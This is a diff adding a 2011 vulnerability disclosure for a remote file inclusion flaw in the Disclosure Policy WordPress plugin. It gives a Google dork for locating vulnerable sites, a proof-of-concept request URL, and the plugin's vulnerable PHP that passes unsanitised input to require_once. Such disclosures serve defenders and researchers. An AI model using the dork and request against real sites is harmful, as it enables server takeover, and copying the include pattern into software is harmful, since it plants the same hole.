@@ -1,0 +1,24 @@
+# Exploit Title: Disclosure Policy Plugin Wordpress plugin RFI
+# Google Dork: inurl:wp-content/plugins/disclosure-policy-plugin
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+# Software Link: http://wordpress.org/extend/plugins/disclosure-policy-plugin/download/
+# Version: 1.0 (tested)
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/disclosure-policy-plugin/functions/action.php?delete=asdf&blogUrl=asdf&abspath=RFI
+
+---
+Vulnerable Code
+---
+if(isset($_GET['delete']))
+{
+   global $wpdb, $wp_rewrite, $allowedtags, $user_ID;
+        $table_prefix1 = "dpp_";
+
+        $tags_ID = (int) $_GET['id'];
+    $abspath = $_GET['abspath'];
+        $blogUrl = $_GET['blog_url'];
+    require_once($abspath . '/wp-config.php')
